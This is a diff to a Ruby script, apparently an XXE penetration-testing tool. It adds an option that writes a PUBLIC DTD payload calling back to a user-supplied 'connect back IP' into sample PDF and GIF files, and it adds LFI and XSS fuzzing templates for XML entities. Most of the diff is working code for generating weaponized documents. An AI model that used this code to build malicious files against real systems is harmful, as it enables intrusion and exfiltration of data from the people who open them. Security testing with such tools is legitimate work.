@@ -25,6 +25,9 @@ OptionParser.new do |opts|
 	opts.on("-z", "--fuzz=FUZZ_FILE", "A file including XSS to fuzz for, one per line") do |v|
 		@options["fuzz"] = v
 	end
+	opts.on("-t", "--poc=POC", "Very simple XMP POC test; handles PDF, GIF right now") do |v|
+		@options["poc"] = v
+	end
 	opts.on("-i", "--ip=IP", "Set connect back IP") do |v|
 		@options["ip"] = v
 	end
@@ -61,8 +64,6 @@ def read_payloads()
 	pl["CDATA_badchars"] = ['<!DOCTYPE root [<!ENTITY xxe "<![CDATA[\';!--<QQQQQ>={()}]]>">]>', "HTML "]
 	pl["no_CDATA_badchars"] = ['<!DOCTYPE root [<!ENTITY xxe "\';!--<QQQQQ>={()}">]>', "U"]
 
-	# LFI tests
-
 	return pl
 end
 
@@ -70,8 +71,8 @@ def read_fuzz_payloads()
 
 	pl = {}
 	pl["fuzz_CDATA (XSS Testing)"] = ['<!DOCTYPE root [<!ENTITY xxe "<![CDATA[FUZZ]]>">]>', "Takes in a file of input and inserts into CDATA"]
-	pl["fuzz_no_CDATA (XSS Testing)"] = ['<!DOCTYPE root [<!ENTITY xxe "">]>', "Takes in a file of input and inserts directly into the entity"]
-
+	pl["fuzz_no_CDATA (XSS Testing)"] = ['<!DOCTYPE root [<!ENTITY xxe "FUZZ">]>', "Takes in a file of input and inserts directly into the entity"]
+	pl["fuzz_LFI"] = ['<!DOCTYPE root [<!ENTITY xxe "FUZZ">]>', "Takes in a file of input and inserts directly into the entity"]
 	return pl
 end
 
@@ -112,6 +113,53 @@ if @options["string"]
 	exit
 end
 
+if @options["poc"]
+	payload = '<!DOCTYPE roottag PUBLIC "-//OXML/XXE/EN" "http://IP/EXF">'
+	if payload =~ /IP/ and @options["ip"].size == 0
+		@options["ip"] = ask("Payload Requires a connect back IP:")
+	end
+	payload = payload.gsub("IP",@options["ip"])
+
+	if @options["poc"] == "pdf"
+		# it's a hack, but gsubing into form pdf
+		file = "./samples/form.pdf"
+
+		puts "|+| Inserting into #{file}. Currently this only tests for PUBLIC DTD"
+
+		len = 16724+payload.size
+		nm = "./output/o_#{Time.now.to_i}.pdf"
+
+		out = File.open(nm,"wb")
+		fil = File.open(file,"rb")
+
+		while(line = fil.gets)
+			line = line.chomp
+			line = line.gsub("-----",len.to_s)
+			line = line.gsub("---",payload)
+			out.puts(line)
+		end
+		puts "|+| Wrote to #{nm}"
+		exit
+	elsif @options["poc"] == "gif"
+		file = "./samples/xmp.gif"
+
+		puts "|+| Inserting into #{file}. Currently this only tests for PUBLIC DTD"
+
+		nm = "./output/o_#{Time.now.to_i}.gif"
+
+		out = File.open(nm,"wb")
+		fil = File.open(file,"rb")
+
+		while(line = fil.gets)
+			line = line.gsub("-----",payload)
+			out.puts(line)
+		end
+		puts "|+| Wrote to #{nm}"
+		exit
+	end
+end
+
+
 if @options["fuzz"]
 	fuzzies = []
 
@@ -134,6 +182,8 @@ if @options["fuzz"]
 			menu.choice pload[0] do payload1 = pload[1][0] end
 		end
 	end
+
+	@options["file"] = "./samples/lfi_test.docx" if payload == '<!DOCTYPE root [<!ENTITY xxe "FUZZ">]>'
 
 	i = 0
 	fuzzies.each do |fu|
